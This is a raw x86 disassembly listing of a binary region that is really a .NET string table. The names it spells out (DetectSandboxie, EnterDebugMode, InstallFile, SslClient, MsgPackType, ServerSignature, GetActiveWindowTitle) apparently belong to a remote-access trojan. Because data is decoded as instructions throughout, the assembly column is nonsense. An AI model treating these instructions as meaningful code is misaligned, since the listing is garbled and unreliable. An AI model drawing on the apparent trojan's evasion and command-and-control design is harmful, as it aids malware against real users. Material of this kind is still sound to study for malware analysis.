  407c5f:	66 65 72 3e          	data16 gs jb 0x407ca1
  407c63:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c67:	61                   	popa
  407c68:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c6b:	6e                   	outsb  %ds:(%esi),(%dx)
  407c6c:	67 46                	addr16 inc %esi
  407c6e:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c75:	66 66 73 65          	data16 data16 jae 0x407cde
  407c79:	74 3e                	je     0x407cb9
  407c7b:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c7f:	61                   	popa
  407c80:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c83:	6e                   	outsb  %ds:(%esi),(%dx)
  407c84:	67 46                	addr16 inc %esi
  407c86:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c8d:	73 6c                	jae    0x407cfb
  407c8f:	43                   	inc    %ebx
  407c90:	6c                   	insb   (%dx),%es:(%edi)
  407c91:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c98:	5f                   	pop    %edi
  407c99:	42                   	inc    %edx
  407c9a:	61                   	popa
  407c9b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c9e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c9f:	67 46                	addr16 inc %esi
  407ca1:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407ca8:	63 70 43             	arpl   %esi,0x43(%eax)
  407cab:	6c                   	insb   (%dx),%es:(%edi)
  407cac:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cb3:	5f                   	pop    %edi
  407cb4:	42                   	inc    %edx
  407cb5:	61                   	popa
  407cb6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cb9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cba:	67 46                	addr16 inc %esi
  407cbc:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cc3:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc4:	65 72 41             	gs jb  0x407d08
  407cc7:	64 64 4d             	fs fs dec %ebp
  407cca:	61                   	popa
  407ccb:	70 43                	jo     0x407d10
  407ccd:	68 69 6c 64 00       	push   $0x646c69
  407cd2:	49                   	dec    %ecx
  407cd3:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd4:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd5:	65 72 41             	gs jb  0x407d19
  407cd8:	64 64 41             	fs fs inc %ecx
  407cdb:	72 72                	jb     0x407d4f
  407cdd:	61                   	popa
  407cde:	79 43                	jns    0x407d23
  407ce0:	68 69 6c 64 00       	push   $0x646c69
  407ce5:	68 57 6e 64 00       	push   $0x646e57
  407cea:	53                   	push   %ebx
  407ceb:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ced:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407cf1:	70 65                	jo     0x407d58
  407cf3:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf4:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cf8:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cff:	61 
  407d00:	6c                   	insb   (%dx),%es:(%edi)
  407d01:	75 65                	jne    0x407d68
  407d03:	4b                   	dec    %ebx
  407d04:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d0b:	6c                   	insb   (%dx),%es:(%edi)
  407d0c:	61                   	popa
  407d0d:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d10:	43                   	inc    %ebx
  407d11:	72 65                	jb     0x407d78
  407d13:	61                   	popa
  407d14:	74 65                	je     0x407d7b
  407d16:	49                   	dec    %ecx
  407d17:	6e                   	outsb  %ds:(%esi),(%dx)
  407d18:	73 74                	jae    0x407d8e
  407d1a:	61                   	popa
  407d1b:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1c:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d1f:	73 65                	jae    0x407d86
  407d21:	74 5f                	je     0x407d82
  407d23:	4d                   	dec    %ebp
  407d24:	6f                   	outsl  %ds:(%esi),(%dx)
  407d25:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d2a:	6c                   	insb   (%dx),%es:(%edi)
  407d2b:	65 4d                	gs dec %ebp
  407d2d:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2e:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d33:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d3a:	64 65 
  407d3c:	00 45 6e             	add    %al,0x6e(%ebp)
  407d3f:	74 65                	je     0x407da6
  407d41:	72 44                	jb     0x407d87
  407d43:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d47:	4d                   	dec    %ebp
  407d48:	6f                   	outsl  %ds:(%esi),(%dx)
  407d49:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d4e:	79 70                	jns    0x407dc0
  407d50:	74 6f                	je     0x407dc1
  407d52:	53                   	push   %ebx
  407d53:	74 72                	je     0x407dc7
  407d55:	65 61                	gs popa
  407d57:	6d                   	insl   (%dx),%es:(%edi)
  407d58:	4d                   	dec    %ebp
  407d59:	6f                   	outsl  %ds:(%esi),(%dx)
  407d5a:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d5f:	6d                   	insl   (%dx),%es:(%edi)
  407d60:	70 72                	jo     0x407dd4
  407d62:	65 73 73             	gs jae 0x407dd8
  407d65:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d6c:	00 43 69             	add    %al,0x69(%ebx)
  407d6f:	70 68                	jo     0x407dd9
  407d71:	65 72 4d             	gs jb  0x407dc1
  407d74:	6f                   	outsl  %ds:(%esi),(%dx)
  407d75:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d7a:	6c                   	insb   (%dx),%es:(%edi)
  407d7b:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d80:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d85:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d89:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d8c:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d91:	65 74 65             	gs je  0x407df9
  407d94:	53                   	push   %ebx
  407d95:	75 62                	jne    0x407df9
  407d97:	4b                   	dec    %ebx
  407d98:	65 79 54             	gs jns 0x407def
  407d9b:	72 65                	jb     0x407e02
  407d9d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407da1:	74 5f                	je     0x407e02
  407da3:	4d                   	dec    %ebp
  407da4:	65 73 73             	gs jae 0x407e1a
  407da7:	61                   	popa
  407da8:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407dad:	74 65                	je     0x407e14
  407daf:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407db3:	6e                   	outsb  %ds:(%esi),(%dx)
  407db4:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407db8:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dbf:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dc3:	45                   	inc    %ebp
  407dc4:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc5:	75 6d                	jne    0x407e34
  407dc7:	65 72 61             	gs jb  0x407e2b
  407dca:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dce:	49                   	dec    %ecx
  407dcf:	44                   	inc    %esp
  407dd0:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dd7:	6c                   	insb   (%dx),%es:(%edi)
  407dd8:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407ddd:	6f                   	outsl  %ds:(%esi),(%dx)
  407dde:	75 62                	jne    0x407e42
  407de0:	6c                   	insb   (%dx),%es:(%edi)
  407de1:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407de5:	61                   	popa
  407de6:	70 44                	jo     0x407e2c
  407de8:	6f                   	outsl  %ds:(%esi),(%dx)
  407de9:	75 62                	jne    0x407e4d
  407deb:	6c                   	insb   (%dx),%es:(%edi)
  407dec:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407df0:	74 5f                	je     0x407e51
  407df2:	48                   	dec    %eax
  407df3:	61                   	popa
  407df4:	6e                   	outsb  %ds:(%esi),(%dx)
  407df5:	64 6c                	fs insb (%dx),%es:(%edi)
  407df7:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407dfb:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfc:	74 69                	je     0x407e67
  407dfe:	6d                   	insl   (%dx),%es:(%edi)
  407dff:	65 46                	gs inc %esi
  407e01:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e08:	64 6c                	fs insb (%dx),%es:(%edi)
  407e0a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e0e:	74 4d                	je     0x407e5d
  407e10:	6f                   	outsl  %ds:(%esi),(%dx)
  407e11:	64 75 6c             	fs jne 0x407e80
  407e14:	65 48                	gs dec %eax
  407e16:	61                   	popa
  407e17:	6e                   	outsb  %ds:(%esi),(%dx)
  407e18:	64 6c                	fs insb (%dx),%es:(%edi)
  407e1a:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e1e:	6e                   	outsb  %ds:(%esi),(%dx)
  407e1f:	74 69                	je     0x407e8a
  407e21:	6d                   	insl   (%dx),%es:(%edi)
  407e22:	65 54                	gs push %esp
  407e24:	79 70                	jns    0x407e96
  407e26:	65 48                	gs dec %eax
  407e28:	61                   	popa
  407e29:	6e                   	outsb  %ds:(%esi),(%dx)
  407e2a:	64 6c                	fs insb (%dx),%es:(%edi)
  407e2c:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e30:	74 54                	je     0x407e86
  407e32:	79 70                	jns    0x407ea4
  407e34:	65 46                	gs inc %esi
  407e36:	72 6f                	jb     0x407ea7
  407e38:	6d                   	insl   (%dx),%es:(%edi)
  407e39:	48                   	dec    %eax
  407e3a:	61                   	popa
  407e3b:	6e                   	outsb  %ds:(%esi),(%dx)
  407e3c:	64 6c                	fs insb (%dx),%es:(%edi)
  407e3e:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e42:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e49:	65 
  407e4a:	00 57 72             	add    %dl,0x72(%edi)
  407e4d:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e54:	6c 
  407e55:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e5a:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e61:	65 74 41             	gs je  0x407ea5
  407e64:	73 53                	jae    0x407eb9
  407e66:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e6d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6e:	73 74                	jae    0x407ee4
  407e70:	61                   	popa
  407e71:	6c                   	insb   (%dx),%es:(%edi)
  407e72:	6c                   	insb   (%dx),%es:(%edi)
  407e73:	46                   	inc    %esi
  407e74:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e7b:	6f 
  407e7c:	64 65 46             	fs gs inc %esi
  407e7f:	72 6f                	jb     0x407ef0
  407e81:	6d                   	insl   (%dx),%es:(%edi)
  407e82:	46                   	inc    %esi
  407e83:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e8a:	65 
  407e8b:	42                   	inc    %edx
  407e8c:	79 74                	jns    0x407f02
  407e8e:	65 73 54             	gs jae 0x407ee5
  407e91:	6f                   	outsl  %ds:(%esi),(%dx)
  407e92:	46                   	inc    %esi
  407e93:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e9a:	6e 
  407e9b:	52                   	push   %edx
  407e9c:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9d:	6c                   	insb   (%dx),%es:(%edi)
  407e9e:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407ea2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea3:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ea5:	77 73                	ja     0x407f1a
  407ea7:	42                   	inc    %edx
  407ea8:	75 69                	jne    0x407f13
  407eaa:	6c                   	insb   (%dx),%es:(%edi)
  407eab:	74 49                	je     0x407ef6
  407ead:	6e                   	outsb  %ds:(%esi),(%dx)
  407eae:	52                   	push   %edx
  407eaf:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb0:	6c                   	insb   (%dx),%es:(%edi)
  407eb1:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eb5:	74 41                	je     0x407ef8
  407eb7:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407ebb:	65 57                	gs push %edi
  407ebd:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ec4:	74 6c                	je     0x407f32
  407ec6:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407eca:	74 5f                	je     0x407f2b
  407ecc:	4d                   	dec    %ebp
  407ecd:	61                   	popa
  407ece:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ed5:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ed9:	6f                   	outsl  %ds:(%esi),(%dx)
  407eda:	63 65 73             	arpl   %esp,0x73(%ebp)
  407edd:	73 4d                	jae    0x407f2c
  407edf:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee0:	64 75 6c             	fs jne 0x407f4f
  407ee3:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ee7:	74 5f                	je     0x407f48
  407ee9:	57                   	push   %edi
  407eea:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407ef1:	79 6c                	jns    0x407f5f
  407ef3:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ef7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef8:	63 65 73             	arpl   %esp,0x73(%ebp)
  407efb:	73 57                	jae    0x407f54
  407efd:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f04:	79 6c                	jns    0x407f72
  407f06:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f0a:	74 5f                	je     0x407f6b
  407f0c:	4e                   	dec    %esi
  407f0d:	61                   	popa
  407f0e:	6d                   	insl   (%dx),%es:(%edi)
  407f0f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f13:	74 5f                	je     0x407f74
  407f15:	46                   	inc    %esi
  407f16:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f1d:	00 
  407f1e:	73 65                	jae    0x407f85
  407f20:	74 5f                	je     0x407f81
  407f22:	46                   	inc    %esi
  407f23:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f2a:	00 
  407f2b:	47                   	inc    %edi
  407f2c:	65 74 54             	gs je  0x407f83
  407f2f:	65 6d                	gs insl (%dx),%es:(%edi)
  407f31:	70 46                	jo     0x407f79
  407f33:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f3a:	00 
  407f3b:	47                   	inc    %edi
  407f3c:	65 74 46             	gs je  0x407f85
  407f3f:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f46:	00 
  407f47:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f4e:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f53:	6f                   	outsl  %ds:(%esi),(%dx)
  407f54:	64 75 6c             	fs jne 0x407fc3
  407f57:	65 4e                	gs dec %esi
  407f59:	61                   	popa
  407f5a:	6d                   	insl   (%dx),%es:(%edi)
  407f5b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f5f:	74 5f                	je     0x407fc0
  407f61:	4d                   	dec    %ebp
  407f62:	61                   	popa
  407f63:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f66:	6e                   	outsb  %ds:(%esi),(%dx)
  407f67:	65 4e                	gs dec %esi
  407f69:	61                   	popa
  407f6a:	6d                   	insl   (%dx),%es:(%edi)
  407f6b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f6f:	74 5f                	je     0x407fd0
  407f71:	4f                   	dec    %edi
  407f72:	53                   	push   %ebx
  407f73:	46                   	inc    %esi
  407f74:	75 6c                	jne    0x407fe2
  407f76:	6c                   	insb   (%dx),%es:(%edi)
  407f77:	4e                   	dec    %esi
  407f78:	61                   	popa
  407f79:	6d                   	insl   (%dx),%es:(%edi)
  407f7a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f7e:	74 5f                	je     0x407fdf
  407f80:	46                   	inc    %esi
  407f81:	75 6c                	jne    0x407fef
  407f83:	6c                   	insb   (%dx),%es:(%edi)
  407f84:	4e                   	dec    %esi
  407f85:	61                   	popa
  407f86:	6d                   	insl   (%dx),%es:(%edi)
  407f87:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f8b:	56                   	push   %esi
  407f8c:	61                   	popa
  407f8d:	6c                   	insb   (%dx),%es:(%edi)
  407f8e:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f95:	6e 
  407f96:	4e                   	dec    %esi
  407f97:	61                   	popa
  407f98:	6d                   	insl   (%dx),%es:(%edi)
  407f99:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f9d:	74 5f                	je     0x407ffe
  407f9f:	55                   	push   %ebp
  407fa0:	73 65                	jae    0x408007
  407fa2:	72 4e                	jb     0x407ff2
  407fa4:	61                   	popa
  407fa5:	6d                   	insl   (%dx),%es:(%edi)
  407fa6:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fab:	65 72 4e             	gs jb  0x407ffc
  407fae:	61                   	popa
  407faf:	6d                   	insl   (%dx),%es:(%edi)
  407fb0:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fb4:	74 4e                	je     0x408004
  407fb6:	61                   	popa
  407fb7:	6d                   	insl   (%dx),%es:(%edi)
  407fb8:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fbc:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fc0:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc1:	73 74                	jae    0x408037
  407fc3:	4e                   	dec    %esi
  407fc4:	61                   	popa
  407fc5:	6d                   	insl   (%dx),%es:(%edi)
  407fc6:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fca:	6d                   	insl   (%dx),%es:(%edi)
  407fcb:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fd0:	65 54                	gs push %esp
  407fd2:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fd9:	5f                   	pop    %edi
  407fda:	4c                   	dec    %esp
  407fdb:	61                   	popa
  407fdc:	73 74                	jae    0x408052
  407fde:	57                   	push   %edi
  407fdf:	72 69                	jb     0x40804a
  407fe1:	74 65                	je     0x408048
  407fe3:	54                   	push   %esp
  407fe4:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407feb:	6e                   	outsb  %ds:(%esi),(%dx)
  407fec:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407ff3:	54                   	push   %esp
  407ff4:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ffb:	74 65                	je     0x408062
  407ffd:	4c                   	dec    %esp
  407ffe:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408005:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408008:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40800c:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408013:	6d                   	insl   (%dx),%es:(%edi)
  408014:	65 54                	gs push %esp
  408016:	79 70                	jns    0x408088
  408018:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40801c:	74 5f                	je     0x40807d
  40801e:	56                   	push   %esi
  40801f:	61                   	popa
  408020:	6c                   	insb   (%dx),%es:(%edi)
  408021:	75 65                	jne    0x408088
  408023:	54                   	push   %esp
  408024:	79 70                	jns    0x408096
  408026:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  40802a:	6c                   	insb   (%dx),%es:(%edi)
  40802b:	75 65                	jne    0x408092
  40802d:	54                   	push   %esp
  40802e:	79 70                	jns    0x4080a0
  408030:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  408034:	67 50                	addr16 push %eax
  408036:	61                   	popa
  408037:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  40803a:	79 70                	jns    0x4080ac
  40803c:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408040:	6f                   	outsl  %ds:(%esi),(%dx)
  408041:	74 6f                	je     0x4080b2
  408043:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408046:	54                   	push   %esp
  408047:	79 70                	jns    0x4080b9
  408049:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40804d:	74 54                	je     0x4080a3
  40804f:	79 70                	jns    0x4080c1
  408051:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408055:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408058:	74 54                	je     0x4080ae
  40805a:	79 70                	jns    0x4080cc
  40805c:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408060:	6c                   	insb   (%dx),%es:(%edi)
  408061:	65 53                	gs push %ebx
  408063:	68 61 72 65 00       	push   $0x657261
  408068:	53                   	push   %ebx
  408069:	79 73                	jns    0x4080de
  40806b:	74 65                	je     0x4080d2
  40806d:	6d                   	insl   (%dx),%es:(%edi)
  40806e:	2e 43                	cs inc %ebx
  408070:	6f                   	outsl  %ds:(%esi),(%dx)
  408071:	72 65                	jb     0x4080d8
  408073:	00 53 65             	add    %dl,0x65(%ebx)
  408076:	72 76                	jb     0x4080ee
  408078:	65 72 73             	gs jb  0x4080ee
  40807b:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408082:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  408086:	6f                   	outsl  %ds:(%esi),(%dx)
  408087:	73 65                	jae    0x4080ee
  408089:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40808d:	70 6f                	jo     0x4080fe
  40808f:	73 65                	jae    0x4080f6
  408091:	00 50 61             	add    %dl,0x61(%eax)
  408094:	72 73                	jb     0x408109
  408096:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  40809a:	72 52                	jb     0x4080ee
  40809c:	65 76 65             	gs jbe 0x408104
  40809f:	72 73                	jb     0x408114
  4080a1:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080a5:	30 39                	xor    %bh,(%ecx)
  4080a7:	43                   	inc    %ebx
  4080a8:	65 72 74             	gs jb  0x40811f
  4080ab:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080b2:	00 56 61             	add    %dl,0x61(%esi)
  4080b5:	6c                   	insb   (%dx),%es:(%edi)
  4080b6:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080bd:	72 
  4080be:	76 65                	jbe    0x408125
  4080c0:	72 43                	jb     0x408105
  4080c2:	65 72 74             	gs jb  0x408139
  4080c5:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080cc:	00 63 65             	add    %ah,0x65(%ebx)
  4080cf:	72 74                	jb     0x408145
  4080d1:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d8:	00 43 72             	add    %al,0x72(%ebx)
  4080db:	65 61                	gs popa
  4080dd:	74 65                	je     0x408144
  4080df:	00 53 65             	add    %dl,0x65(%ebx)
  4080e2:	74 54                	je     0x408138
  4080e4:	68 72 65 61 64       	push   $0x64616572
  4080e9:	45                   	inc    %ebp
  4080ea:	78 65                	js     0x408151
  4080ec:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080ef:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080f6:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080fb:	65 74 65             	gs je  0x408163
  4080fe:	00 43 61             	add    %al,0x61(%ebx)
  408101:	6c                   	insb   (%dx),%es:(%edi)
  408102:	6c                   	insb   (%dx),%es:(%edi)
  408103:	53                   	push   %ebx
  408104:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40810b:	74 
  40810c:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408110:	6d                   	insl   (%dx),%es:(%edi)
  408111:	70 69                	jo     0x40817c
  408113:	6c                   	insb   (%dx),%es:(%edi)
  408114:	65 72 47             	gs jb  0x40815e
  408117:	65 6e                	outsb  %gs:(%esi),(%dx)
  408119:	65 72 61             	gs jb  0x40817d
  40811c:	74 65                	je     0x408183
  40811e:	64 41                	fs inc %ecx
  408120:	74 74                	je     0x408196
  408122:	72 69                	jb     0x40818d
  408124:	62 75 74             	bound  %esi,0x74(%ebp)
  408127:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40812c:	75 67                	jne    0x408195
  40812e:	67 61                	addr16 popa
  408130:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408134:	74 74                	je     0x4081aa
  408136:	72 69                	jb     0x4081a1
  408138:	62 75 74             	bound  %esi,0x74(%ebp)
  40813b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40813f:	6d                   	insl   (%dx),%es:(%edi)
  408140:	56                   	push   %esi
  408141:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408148:	74 74                	je     0x4081be
  40814a:	72 69                	jb     0x4081b5
  40814c:	62 75 74             	bound  %esi,0x74(%ebp)
  40814f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408153:	73 65                	jae    0x4081ba
  408155:	6d                   	insl   (%dx),%es:(%edi)
  408156:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40815a:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408161:	72 
  408162:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408169:	73 73                	jae    0x4081de
  40816b:	65 6d                	gs insl (%dx),%es:(%edi)
  40816d:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408171:	72 61                	jb     0x4081d4
  408173:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408176:	61                   	popa
  408177:	72 6b                	jb     0x4081e4
  408179:	41                   	inc    %ecx
  40817a:	74 74                	je     0x4081f0
  40817c:	72 69                	jb     0x4081e7
  40817e:	62 75 74             	bound  %esi,0x74(%ebp)
  408181:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408186:	67 65 74 46          	addr16 gs je 0x4081d0
  40818a:	72 61                	jb     0x4081ed
  40818c:	6d                   	insl   (%dx),%es:(%edi)
  40818d:	65 77 6f             	gs ja  0x4081ff
  408190:	72 6b                	jb     0x4081fd
  408192:	41                   	inc    %ecx
  408193:	74 74                	je     0x408209
  408195:	72 69                	jb     0x408200
  408197:	62 75 74             	bound  %esi,0x74(%ebp)
  40819a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40819e:	73 65                	jae    0x408205
  4081a0:	6d                   	insl   (%dx),%es:(%edi)
  4081a1:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081a5:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081ac:	69 
  4081ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4081af:	41                   	inc    %ecx
  4081b0:	74 74                	je     0x408226
  4081b2:	72 69                	jb     0x40821d
  4081b4:	62 75 74             	bound  %esi,0x74(%ebp)
  4081b7:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081bb:	73 65                	jae    0x408222
  4081bd:	6d                   	insl   (%dx),%es:(%edi)
  4081be:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c4:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081ca:	74 69                	je     0x408235
  4081cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ce:	41                   	inc    %ecx
  4081cf:	74 74                	je     0x408245
  4081d1:	72 69                	jb     0x40823c
